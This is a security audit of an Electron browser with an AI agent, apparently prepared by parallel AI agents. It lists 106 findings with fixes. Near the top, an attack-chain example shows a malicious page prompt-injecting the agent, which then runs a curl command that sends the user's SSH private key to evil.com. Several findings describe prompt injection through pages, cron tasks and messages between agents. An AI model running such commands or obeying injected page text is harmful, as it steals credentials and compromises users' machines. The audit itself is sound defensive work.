# Tappi Browser — Phase 9 Security Audit

**Date:** 2026-02-22  
**Audited by:** 4 parallel agents covering Electron/IPC, Network/Auth, Agent/Shell, Frontend/Misc  
**Codebase:** 22,557 lines across 43 source files  
**Total findings:** 106 (16 Critical, 29 High, 37 Medium, 24 Low)

---

## 🔴 CRITICAL Findings (16) — Must Fix Before Release

### Attack Chain: The Devastating Combo
> **Visiting a malicious website with dev mode ON → prompt injection via page content → agent runs `exec("curl evil.com/exfil?$(cat ~/.ssh/id_rsa)")` → full machine compromise.**
>
> This chain exists because: (1) no prompt injection defense, (2) unrestricted shell access, (3) no file system sandbox, (4) no user confirmation for dangerous operations.

| # | Finding | File:Line | Impact |
|---|---------|-----------|--------|
| C1 | **Generic `invoke`/`on` in chrome preload** — exposes raw `ipcRenderer` to any code in chrome renderer, bypasses all contextBridge isolation | `preload.ts:252-258` | XSS in chrome UI = full app compromise |
| C2 | **`sandbox: false` on Aria tab** — unsandboxed renderer processing AI-generated markdown | `tab-manager.ts:128` | Renderer escape risk |
| C3 | **`sandbox: false` on partitioned content tabs** — arbitrary web pages run unsandboxed | `tab-manager.ts:185` | Renderer escape risk |
| C4 | **No prompt injection defense** — page content from `elements()`/`text()` flows raw into LLM context with zero boundary marking | `agent.ts:55-140` | Malicious pages can instruct the agent |
| C5 | **Unrestricted shell execution** — `execSync(command, {shell: bash})` with LLM-controlled input, no validation/confirmation | `shell-tools.ts:79-88` | Arbitrary code execution |
| C6 | **No file system sandbox** — `resolvePath()` passes absolute paths through, no traversal protection | `file-tools.ts:17-20` | Read/write/delete any file |
| C7 | **`eval_js` not gated behind dev mode** — arbitrary JS execution in page context available to all users | `tool-registry.ts:91-97` | Page data exfiltration |
| C8 | **No SSRF protection in HTTP tools** — can hit AWS metadata, localhost services, internal IPs | `http-tools.ts:196-250` | Cloud credential theft |
| C9 | **Arbitrary JS eval via API** — `/api/tabs/:id/eval` lets any local process execute JS in browser tabs | `api-server.ts:187-196` | Full browser compromise |
| C10 | **Shell exec via API** — `/api/tools/exec` endpoint, protected only by a static file token | `api-server.ts:295-320` | RCE via local process |
| C11 | **Password vault falls back to base64** — when safeStorage unavailable, passwords stored reversibly | `password-vault.ts:15-19` | Plaintext credential exposure |
| C12 | **API key vault falls back to plaintext** — same safeStorage fallback issue | `http-tools.ts:181-186` | API key exposure |
| C13 | **XSS via markdown rendering** — `marked.parse()` output inserted via innerHTML with only a bypassable `<script>` regex | `app.js:69-80`, `aria.js:68-79` | Chrome UI XSS → full app via `window.tappi` |
| C14 | **Raw HTML injection via `_raw` messages** — deep mode content inserted via innerHTML unsanitized | `app.js:528-530` | Chrome UI XSS |
| C15 | **Cron jobs execute with full agent tools unsandboxed** — persistent backdoor vector, stale devMode flag | `cron-manager.ts:166-227` | Persistent compromise |
| C16 | **No CSP on chrome UI** — no Content Security Policy on the main privileged window | `main.ts` | XSS amplification |

---

## 🟠 HIGH Findings (29)

| # | Finding | File:Line |
|---|---------|-----------|
| H1 | No `will-navigate` guard on main window — chrome UI could navigate to malicious URL | `main.ts` |
| H2 | `executeJavaScript` with credential data (autofill) — password in JS string | `main.ts:1576` |
| H3 | Dev TCP server (port 18900) — no authentication, any local process can send commands | `main.ts:1900-1960` |
| H4 | No input validation on IPC handlers — arbitrary URLs, paths, configs accepted | `main.ts` (multiple) |
| H5 | `nodeIntegration` not explicitly `false` on content tabs (relies on default) | `tab-manager.ts:183` |
| H6 | No CORS/Origin validation on API server — malicious websites can probe local API | `api-server.ts:109-130` |
| H7 | API token lacks rotation/expiration — persists forever once generated | `api-server.ts:43-55` |
| H8 | Non-constant-time token comparison — timing attack possible | `api-server.ts:121` |
| H9 | Path traversal in HTTP tools `saveToFile` — can write to arbitrary paths | `http-tools.ts:225-229` |
| H10 | Config modification via API without field restrictions | `api-server.ts:279-288` |
| H11 | Bedrock API key stored as `accessKey:secretKey` concatenated — falls through plaintext path | `llm-client.ts:167-171` |
| H12 | Credential intercept script holds password in page-accessible JS variable | `password-vault.ts:128-161` |
| H13 | Teammates always get developer mode shell access (hardcoded `true`) | `team-manager.ts:194` |
| H14 | Sub-agents don't inherit developer mode gate (inconsistent with teammates) | `sub-agent.ts:111-112` |
| H15 | `file_delete` can recursively delete any directory (no sandbox) | `file-tools.ts:137-145` |
| H16 | No resource limits on sub-agents/teammates — unbounded memory, CPU, tool calls | `sub-agent.ts:55`, `team-manager.ts:72` |
| H17 | Output buffer can grow to 10MB per entry with no session-wide cap | `output-buffer.ts:5-6` |
| H18 | API key partially logged (first 12 chars) — enough to identify some keys | `agent.ts:236` |
| H19 | `exec_kill` can kill ANY system process, not just agent-spawned ones | `shell-tools.ts:133-142` |
| H20 | Password vault autofill builds JS string — potential injection if credentials contain special chars | `tool-registry.ts:399-402` |
| H21 | `innerHTML` used with partially-escaped content in history/bookmarks panels | `app.js:376-390` |
| H22 | Download path traversal — server-supplied filename can escape download dir via `../../` | `download-manager.ts:53-57` |
| H23 | Screenshot/recording tool allows arbitrary file write paths | `capture-tools.ts:44-49` |
| H24 | mpv command arguments not sanitized — URL starting with `--` could inject options | `media-engine.ts:278-316` |
| H25 | Conversation messages store sensitive data (API keys, passwords) in plaintext SQLite | `conversation-store.ts:88-107` |
| H26 | Cron job task content can contain prompt injection — persists and auto-executes | `cron-manager.ts:190-196` |
| H27 | `aria.html` CSP allows `unsafe-inline` for scripts — undermines XSS protection | `ui/aria.html:4` |
| H28 | Tab bombing — `setWindowOpenHandler` creates unlimited tabs from `window.open()` calls | `tab-manager.ts:213-216` |
| H29 | Clipboard-read in always-allow permissions — pages can silently read clipboard | `main.ts:1814-1828` |

---

## 🟡 MEDIUM Findings (37)

| # | Finding | File |
|---|---------|------|
| M1 | `webSecurity` not explicitly set (relies on default) | `tab-manager.ts` |
| M2 | Content preload exposes `window.__tappi` to all pages (browser fingerprinting) | `content-preload.js:365` |
| M3 | Content preload sends IPC with page-derived domain (spoofable) | `content-preload.js:317` |
| M4 | No `setWindowOpenHandler` on main window | `main.ts` |
| M5 | Session/partition isolation gap — all regular tabs share cookies | `tab-manager.ts` |
| M6 | SQL ORDER BY with string interpolation (currently safe, fragile) | `database.ts:179` |
| M7 | API key fallback to plaintext storage (same as C12 but config path) | `main.ts:135-140` |
| M8 | API token file permissions not verified on read | `api-server.ts:48` |
| M9 | Rate limiter unbounded memory growth between cleanups | `api-server.ts:62-76` |
| M10 | Error messages may leak internal state (file paths, stack traces) | `api-server.ts:127` |
| M11 | Password generation has fragile modulo (currently unbiased, breaks if charset changes) | `password-vault.ts:88-91` |
| M12 | Autofill script runs in page main world — MutationObserver can intercept | `password-vault.ts:95-135` |
| M13 | Cookies fully exposed via API (session tokens, auth cookies for all sites) | `api-server.ts:235-248` |
| M14 | LLM config `baseUrl` allows arbitrary endpoints (redirect all LLM traffic) | `llm-client.ts:154-157` |
| M15 | Profile export — no minimum password strength enforcement | `profile-manager.ts:221` |
| M16 | Credential checker exposes masked but partially recoverable key info | `credential-checker.ts:31` |
| M17 | Google API key passed as URL query parameter (appears in logs) | `credential-checker.ts:184` |
| M18 | System prompt contains full tool documentation — leakage risk | `agent.ts:143-210` |
| M19 | User profile + browsing history sent to LLM provider (PII leak) | `agent.ts:83-99` |
| M20 | `tool-manager.ts` uses shell for `which` command (injection via tool name) | `tool-manager.ts:145-151` |
| M21 | Git commands in worktree-manager use string interpolation (shell injection) | `worktree-manager.ts:67-79` |
| M22 | No rate limiting on agent tool calls | `agent.ts:226-280` |
| M23 | Teammates share same BrowserContext (no isolation) | `team-manager.ts:188` |
| M24 | Deep Mode subtasks get shell access unconditionally when dev mode on | `subtask-runner.ts:138` |
| M25 | `cwd` parameter in shell tools allows arbitrary directory access | `shell-tools.ts:70-72` |
| M26 | EasyList downloaded without integrity check | `ad-blocker.ts:157-165` |
| M27 | Ad blocker skips all exception rules (`@@`) | `ad-blocker.ts:108` |
| M28 | Inter-agent mailbox has no authentication (impersonation possible) | `mailbox.ts:42-71` |
| M29 | Shared task list has no access control | `shared-task-list.ts:87-100` |
| M30 | User profile sends browsing history (100 domains, 50 URLs) to LLM for generation | `user-profile.ts:118-148` |
| M31 | `executeJavaScript` for full-page screenshot — page can override JSON.stringify | `capture-tools.ts:90-97` |
| M32 | No rate limiting on agent message sending from UI | `app.js:493-502` |
| M33 | ffmpeg concat file uses unsanitized paths (single quote can break format) | `capture-tools.ts:200-202` |
| M34 | `escapeAttr()` doesn't escape `<>` (safe in attribute context, fragile) | `app.js:387` |
| M35 | API response files accumulate for up to 1 hour with potential sensitive data | `http-tools.ts:253-260` |
| M36 | `devmode:api-token` reads from predictable path (`~/.tappi-browser/api-token`) | `main.ts:565-567` |
| M37 | Autocomplete uses separate `escHtml` function (confusing, fragile) | `app.js:241-255` |

---

## 🟢 LOW Findings (24)

<details>
<summary>Click to expand LOW findings</summary>

| # | Finding | File |
|---|---------|------|
| L1 | `executeJavaScript` for fullscreen exit (static string, low risk) | `main.ts:247` |
| L2 | Login state map never bounded | `login-state.ts:13` |
| L3 | Profile deletion uses `fs.rmSync` with `force: true` (no recovery) | `profile-manager.ts:196` |
| L4 | CLI error message reveals token file path | `cli.ts:51` |
| L5 | `readBody` silently swallows JSON parse errors (returns `{}`) | `api-server.ts:84` |
| L6 | OAuth token type leaked via `anthropic-dangerous-direct-browser-access` header | `llm-client.ts:142` |
| L7 | Profile import filename collision uses predictable `Date.now()` suffix | `profile-manager.ts:265` |
| L8 | No audit log of agent actions | `agent.ts` |
| L9 | `exec_bg` processes not killed on session/app exit | `shell-tools.ts:167` |
| L10 | Teammate names not validated (used in paths, branch names) | `team-manager.ts:72` |
| L11 | Inter-agent messages not sanitized (prompt injection between agents) | `team-manager.ts` |
| L12 | `maxBuffer` set to 50MB for shell commands | `shell-tools.ts:84` |
| L13 | Duplicate `escapeHtml`/`escHtml` functions | `app.js:755, 1785` |
| L14 | Session manager doesn't validate domain input | `session-manager.ts:38` |
| L15 | No download size limit or file type filtering | `download-manager.ts` |
| L16 | Stream URL cache has no size limit | `stream-extractor.ts:28` |
| L17 | Conversation FTS query sanitization is minimal | `conversation-store.ts:127` |
| L18 | `newtab.html` has no CSP | `ui/newtab.html` |
| L19 | Shared task list uses monotonic counter (resets on restart) | `shared-task-list.ts:71` |
| L20 | mpv IPC socket path predictable (`/tmp/tappi-mpv-{tabId}.sock`) | `media-engine.ts:254` |
| L21 | Password check handler allows `clipboard-read` always (documented in H29) | `main.ts` |
| L22 | Dark mode toggle uses lazy `require()` in IPC handler (code quality) | `main.ts:1355` |
| L23 | SQL ORDER BY safe but fragile pattern | `database.ts:179` |
| L24 | Content preload `__tappi` namespace detectable (fingerprinting) | `content-preload.js` |

</details>

---

## ✅ What's Done Well

- `contextIsolation: true` set on all windows
- `nodeIntegration: false` on main window and Aria tab  
- All SQLite queries use parameterized statements
- Permission handler defaults to deny, prompts for sensitive permissions
- Passwords not sent via IPC in credential detection flow
- API keys encrypted via `safeStorage` when available
- `setWindowOpenHandler` denies popups on content tabs
- Output buffer grep philosophy — compact views, search for details
- Token-aware file reading prevents context explosion
- API server binds to `127.0.0.1` only

---

## 🎯 Fix Priority (Recommended Order)

### Tier 1 — Security-Critical (blocks release)

| Fix | Addresses | Effort |
|-----|-----------|--------|
| **Remove generic `invoke`/`on` from preload.ts** — expose each channel individually | C1 | 1-2h |
| **Enable `sandbox: true` everywhere** — Aria + partitioned tabs | C2, C3 | 30min |
| **Install DOMPurify** — sanitize all markdown/HTML before innerHTML | C13, C14, H21 | 1h |
| **Add CSP to chrome UI** — `script-src 'self'`, `default-src 'self'` | C16, H27 | 30min |
| **File system sandbox** — enforce workspace confinement, block traversal, check symlinks | C6, H15 | 2h |
| **Shell confirmation dialog** — `dialog.showMessageBox` before every shell command | C5 | 1-2h |
| **Prompt injection defense** — content boundary markers + anti-injection system prompt | C4 | 1h |
| **Gate `eval_js` behind dev mode** | C7 | 15min |
| **SSRF protection** — block internal IPs, metadata endpoints, non-HTTP protocols | C8 | 1h |
| **Credential storage: fail closed** — refuse to store if safeStorage unavailable, warn user | C11, C12, M7 | 1h |

### Tier 2 — High Priority (should fix before release)

| Fix | Addresses | Effort |
|-----|-----------|--------|
| Add `will-navigate` guard on main window | H1 | 15min |
| Constant-time token comparison (`timingSafeEqual`) | H8 | 10min |
| Add Origin header validation to API server | H6 | 30min |
| Auth on dev TCP server (port 18900) | H3 | 30min |
| Restrict `exec_kill` to agent-spawned PIDs only | H19 | 15min |
| Fix teammate devMode inheritance (respect user setting) | H13, H14 | 30min |
| Download path traversal — `path.basename()` on server filename | H22 | 15min |
| Sandbox `saveToFile` + screenshot paths to workspace | H9, H23 | 30min |
| Add `--` before URLs in mpv args | H24 | 10min |
| Restrict API `/api/config` to whitelisted fields | H10 | 30min |
| Add resource limits (max teammates, output buffer cap, bg process limit) | H16, H17 | 1h |
| Reduce API key logging to 4 chars | H18 | 5min |
| IPC input validation (URL protocol allowlist, path sanitization) | H4 | 1-2h |
| Cron job sandbox — restricted tool set, re-check devMode at runtime | C15, H26 | 1-2h |
| Explicitly set `nodeIntegration: false`, `webSecurity: true` on all views | H5, M1 | 15min |
| Fix `setWindowOpenHandler` on main window | M4 | 10min |
| Rate-limit `window.open` tab creation | H28 | 30min |

### Tier 3 — Medium Priority (post-release OK)

All MEDIUM findings — address in follow-up releases. Focus on M20/M21 (shell injection in tool-manager/worktree-manager) first since they're exploitable command injection.

---

## Estimated Total Effort

| Tier | Fixes | Estimated Time |
|------|-------|---------------|
| Tier 1 (blocks release) | 10 fixes | ~10-12 hours |
| Tier 2 (should fix) | 17 fixes | ~8-10 hours |
| Tier 3 (post-release) | 37 fixes | ~15-20 hours |
| **Total** | **64 actionable** | **~33-42 hours** |

---

## Detailed Reports

Full per-finding details with exploit scenarios and fix code:
- `/tmp/security-audit-part1-electron-ipc.md` — Electron core, IPC, preloads, permissions
- `/tmp/security-audit-part2-network-auth.md` — API server, auth, credentials, network
- `/tmp/security-audit-part3-agent-shell.md` — Agent tools, shell, filesystem, sub-agents
- `/tmp/security-audit-part4-frontend-misc.md` — Frontend XSS, media, cron, downloads
